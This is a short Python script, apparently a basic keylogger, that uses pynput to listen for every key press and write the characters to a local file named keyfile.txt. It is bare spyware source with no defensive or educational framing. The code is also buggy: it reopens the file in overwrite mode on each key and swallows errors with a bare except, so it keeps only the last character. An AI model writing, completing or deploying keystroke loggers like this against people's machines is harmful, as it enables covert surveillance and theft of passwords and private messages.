# install pip pynput

import pynput


def keypressed(key):
    print(str(key))
    with open("keyfile.txt", 'w') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("error getting char")


if __name__ == "__main__":
    listener = pynput.keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
